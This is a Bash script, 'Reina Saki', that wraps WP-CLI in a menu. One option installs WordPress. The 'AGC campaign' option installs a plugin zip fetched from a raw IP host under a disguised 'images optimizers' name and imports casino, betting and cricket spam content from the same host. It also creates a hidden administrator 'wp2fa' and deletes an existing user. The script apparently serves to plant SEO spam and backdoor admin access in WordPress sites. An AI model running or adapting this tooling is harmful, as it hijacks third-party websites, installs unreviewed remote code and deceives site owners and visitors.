#!/bin/bash 
# Reina Saki v.0.1


#		---	Colors

#	GLOBAL
version="VERSION 0.1.1"
seperator=-----------------------
seperator=$seperator$seperator$seperator$seperator
TableWidth=120

red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
blue="\033[1;34m"
norm="\033[0m"

source_campaign="http://198.148.116.171/666/xAGCx/campaign.zip"
xml_agc="http://198.148.116.171/666/xAGCx/agc-india.xml"
sql_agc="http://198.148.116.171/666/xAGCx/agc.txt"

owner=$(echo -e "$(pwd)" | cut -d "/" -f3)
if [[ $(id | grep "root" ) ]]; then extra="--allow-root"; else extra=""; fi


_INSTALLWP() {
	echo -e ""
	#	----	VAR		----
	echo -e "[+][STEP 1]-----------------------------------"
	echo ""
	read -p $" [+] Directory name: " dir
	read -p $" [+] DB HOST       : " dbhost
	read -p $" [+] DB NAME       : " dbname
	read -p $" [+] DB USER       : " dbuser
	read -p $" [+] DB PASSWORD   : " dbpass
	read -p $" [+] DB PREFIX     : " dbprefix
	echo ""
	echo -e "[+][STEP 2]----------------------------------"
	echo ""
	read -p $" [+] URL [e.g:example.com/blog/]   : " url
	read -p $" [+] TITLE                         : " title
	read -p $" [+] ADMIN USERNAME                : " username
	read -p $" [+] ADMIN PASSWORD                : " password
	read -p $" [+] ADMIN EMAIL                   : " email

	echo -e ""
	echo -e "${blue}[~]${norm} Downloading Wordpress"
	wget -q https://wordpress.org/latest.zip
	echo -e "${blue}[~]${norm} Inflating Wordpress"
	unzip -q "latest.zip" && rm -rf "latest.zip" && mv "wordpress" ${dir} && cd ${dir}
	
	echo -e "${blue}[~]${norm} Downloading wp-cli.phar"
	curl -sO https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar

	#	Creating config file
	php wp-cli.phar core config --dbhost="${dbhost}" --dbname="${dbname}" --dbuser="${dbuser}" --dbpass="${dbpass}" --dbprefix="${dbprefix}" $extra
	php wp-cli.phar core install --url="${url}" --title="${title}" --admin_user="${username}" --admin_email="${email}" $extra
	php wp-cli.phar user list $extra

	echo -e "${blue}[~]${norm} Updating your default password"
	php wp-cli.phar user update 1 --user_pass="${password}" $extra

	php wp-cli.phar db query "UPDATE $(php wp-cli.phar db prefix $extra)options SET option_value = 'http://${url}' WHERE option_name = 'siteurl'" $extra
	php wp-cli.phar db query "UPDATE $(php wp-cli.phar db prefix $extra)options SET option_value = 'http://${url}' WHERE option_name = 'home'" $extra
	
	echo -e "${green}[+]${norm} http://${url}/wp-login.php"
	echo -e "${green}[+] Username:${norm} ${username}${green} [+] password:${norm} ${password} | ${green}Have Fun ntol! ${norm}"
	if [[ $extra == "--allow-root" ]];
	then
		echo -ne "${red}[!]${norm} You're currently using 'root access', wanna change the owner of${green} ${dir}${norm} to user? (y/n)"
		read -p $" : " owneroption
		if [[ $owneroption == "y" ]] || [[ $owneroption == "Y" ]] || [[ $owneroption == "yes" ]];
		then
			read -p $"[+] Owner: " suowner
			chmod -R ${suowner}:${suowner} ${dir}
			echo -e "${green}[+] Success.${norm} Folder ${dir} changed to ${suowner}:${suowner}"
		else
			echo -e "${red}[-]${norm} Nothing? :("
		fi
	fi

	rm -rf "wp-cli.phar"

}


_INSTALLAGC() {
	username="wp2fa"
	if [[ $extra == "--allow-root" ]];
	then
		echo -ne "${red}[!]${norm} You're currently using 'root access', Please input user owner (e.g:${green} www-data${norm})"
		read -p $" : " owner
	fi

	curl -sO https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar

		php wp-cli.phar db query "UPDATE $(php wp-cli.phar db prefix $extra)options SET option_value = '/%postname%/' WHERE option_name = 'permalink_structure'" $extra
		#php wp-cli.phar db query "SELECT * FROM $(php wp-cli.phar db prefix $extra)options WHERE option_name = 'permalink_structure'" $extra
	echo -e "${blue}[~]${norm} Installing Plugin..."
		php wp-cli.phar plugin install ${source_campaign} --activate $extra
		
		if [[ $extra == "--allow-root" ]];
		then
			echo -e "${blue}[~]${norm} Changing the owner of the plugin folder."
			chown -R ${owner}:${owner} ./wp-content/plugins/wordpress-images-optimizers/
		fi
		php wp-cli.phar plugin install wordpress-importer --activate $extra
				if [[ $extra == "--allow-root" ]];
		then
			echo -e "${blue}[~]${norm} Changing the owner of the plugin folder."
			chown -R ${owner}:${owner} ./wp-content/plugins/wordpress-importer/
		fi
		wget ${xml_agc} -O agc.xml
		php wp-cli.phar import agc.xml --authors=create $extra
		wget ${sql_agc} -O agc.sql
		sed -i -e 's/blogwpx_/'"$(php wp-cli.phar db prefix $extra)"'/g' agc.sql
		php wp-cli.phar db import agc.sql $extra
		php wp-cli.phar user create ${username} adminwordpress@mailwordpress.com --role=administrator $extra
	echo -e "${green}[+] Username:${norm} ${username}"
		php wp-cli.phar user delete "SangamUni2020" --reassign=1 $extra
		php wp-cli.phar user list $extra
	echo -e "${blue}[~]${norm} Changing Permalinks"
		php wp-cli.phar db query "UPDATE $(php wp-cli.phar db prefix $extra)options SET option_value = '/%postname%/' WHERE option_name = 'permalink_structure'" $extra
	echo -e "${green}[+]${norm} Dumping wp-cron-event-list"
		php wp-cli.phar cron event list $extra
	rm -rf "agc.sql"
	rm -rf "agc.xml" && rm -rf "wp-cli.phar"

}


_CAMPAIGNCHECK() {

	curl -sO https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar

	echo -e "${blue}[~]${norm} Dumping plugin list."
		php wp-cli.phar plugin list $extra
	echo -e "${blue}[~]${norm} Dumping wp-cron-event-list."
		php wp-cli.phar cron event list $extra
		# php wp-cli.phar cron event list | grep wp_rest_api_team_cron_check | awk '{print "[+]",$0}'
	echo -e "${blue}[~]${norm} Dumping wp_api_settings table."
		php wp-cli.phar db query "SELECT * FROM $(php wp-cli.phar db prefix $extra)wp_api_settings" $extra
	echo -e "${blue}[~]${norm} Dumping 5 Casino post."
		php wp-cli.phar post list --post_type=casino --posts_per_page=5 $extra
	echo -e "${blue}[~]${norm} Dumping 5 Exchange post."
		php wp-cli.phar post list --post_type=exchange --posts_per_page=5 $extra
	echo -e "${blue}[~]${norm} Dumping 5 Cricket post."
		php wp-cli.phar post list --post_type=cricket --posts_per_page=5 $extra
	echo -e "${blue}[~]${norm} Repairing post_name."
		php wp-cli.phar db query "UPDATE $(php wp-cli.phar db prefix $extra)options SET option_value = '/%postname%/' WHERE option_name = 'permalink_structure'" $extra
	rm -rf "wp-cli.phar"

}



echo -ne "${blue}[~]${norm} Checking WP-CLI.phar is supported or not...\r" && sleep 0.8
curl -sO https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar
if [[ $(php wp-cli.phar $extra | grep "WP-CLI only works correctly from the command line") ]];
then
	echo -ne "${red}[!] Sorry,${norm} WP-CLI is not supported!                             " && exit
else
	echo -ne "${green}[+] Congrats,${norm} WP-CLI is supported!                          \r" && sleep 0.8
fi

rm -rf "wp-cli.phar"

echo -e "



   ██████╗ ███████╗██╗███╗   ██╗ █████╗     ███████╗ █████╗ ██╗  ██╗██╗
   ██╔══██╗██╔════╝██║████╗  ██║██╔══██╗    ██╔════╝██╔══██╗██║ ██╔╝██║
   ██████╔╝█████╗  ██║██╔██╗ ██║███████║    ███████╗███████║█████╔╝ ██║
   ██╔══██╗██╔══╝  ██║██║╚██╗██║██╔══██║    ╚════██║██╔══██║██╔═██╗ ██║
   ██║  ██║███████╗██║██║ ╚████║██║  ██║    ███████║██║  ██║██║  ██╗██║     ${green}${version}${norm}
   ╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝

   ${red}[!]${norm} Reina provides a command-line interface for many actions you might perform in the WordPress admin..
   ${yellow}[i]${norm} Type 'help' for more information.
"

_options() {
	rows="| %-5s| %-30s| %-52s|\n"
	printf "+%.${TableWidth}s\n" "$seperator+"
	printf "| %-5s| %-30s| %-52s|\n" "NO" "Name" "Description"
	printf "+%.${TableWidth}s\n" "$seperator+"
	printf "$rows" "1." "Install Wordpress" "Install wordpress to this server."
	printf "$rows" "2." "Install AGC [campaign]" "Istall AGC to this server."
	printf "$rows" "3." "Health Check [campaign]" "Check table,cron,post from AGC."
	printf "+%.${TableWidth}s\n" "$seperator+"
}

_user() {
	curl -sO https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar && php wp-cli.phar user list && rm -rf "wp-cli.phar"	
}
_plugin() {
	curl -sO https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar && php wp-cli.phar plugin list && rm -rf "wp-cli.phar"	
}
_edituser() {
	echo -e ""
	echo -ne "[+] Username/ID   : " && read -p $"" oldusername 
	echo -ne "[+] New Password  : " && read -p $"" newpassword

	curl -sO https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar && php wp-cli.phar user update "${oldusername}" --user_pass="${newpassword}" && rm -rf "wp-cli.phar"

	echo -e ""
}
_editrole() {
	echo -e ""
	echo -ne "[+] Username/ID               : " && read -p $"" oldusername 
	echo -ne "[+] subscriber/administrator  : " && read -p $"" newrole

	curl -sO https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar && php wp-cli.phar user update "${oldusername}" --role="${newrole}" && rm -rf "wp-cli.phar"

	echo -e ""
}
_help() {
	rows="| %-25s| %-10s| %-52s|\n"
	printf "+%.${TableWidth}s\n" "$seperator+"
	printf "| %-25s| %-10s| %-52s|\n" "Default Command" "Function" "Description"
	printf "+%.${TableWidth}s\n" "$seperator+"
	printf "$rows" "- clear" "bash" "Clear the terminal."
	printf "$rows" "- help" "bash" "Showing this information."
	printf "$rows" "- exit" "bash" "Exit from Reina Saki."
	printf "$rows" "- show options" "framework" "Show the menu for options."
	printf "$rows" "- show user(s)" "wp-cli" "Show all users of the website."
	printf "$rows" "- show plugin(s)" "wp-cli" "Show all plugins of the website."
	printf "$rows" "- edit user" "wp-cli" "Edit user credentials [password] from website."
	printf "$rows" "- edit role" "wp-cli" "Edit user credentials [role] from website."
	printf "+%.${TableWidth}s\n" "$seperator+"

}

_command() {
	if [[ -f "$(pwd)/wp-cli.phar" ]]; then
		printf "\033[31m[!]\033[0m"
	else
		printf "\033[0m"
	fi
	while IFS="" read -r -e -d $'\n' -p '[ REINA-SAKI ] >> ' option; do
		history -s "$option"

			if [[ $option == 'exit' ]]; then exit
			elif [[ $option == 'clear' ]]; then clear
			elif [[ $option == 'help' ]]; then _help
			elif [[ $option == 'show options' ]]; then _options
			elif [[ $option == 'show user'* ]]; then _user
			elif [[ $option == 'show plugin'* ]]; then _plugin
			elif [[ $option == 'edit user' ]]; then _edituser
			elif [[ $option == 'edit role' ]]; then _editrole
			elif [[ $option == '1' ]]; then _INSTALLWP
			elif [[ $option == '2' ]]; then _INSTALLAGC
			elif [[ $option == '3' ]]; then _CAMPAIGNCHECK
			else command
			fi
	done
}

_options
_command
#read -p $" : Select an option >> " option

#if [[ $option == "1" ]];
#	then
#		_INSTALLWP 
#elif [[ $option == "2" ]];
#	then
#		_INSTALLAGC
#elif [[ $option == "3" ]];
#	then
#		_CAMPAIGNCHECK
#elif [[ $option == "0" ]];
#	then
#		exit
#else
#	echo -e "Pilihen Goblok!"
#fi


#rm -rf "agc.sql"
#rm -rf "agc.xml" && rm -rf "wp-cli.phar"
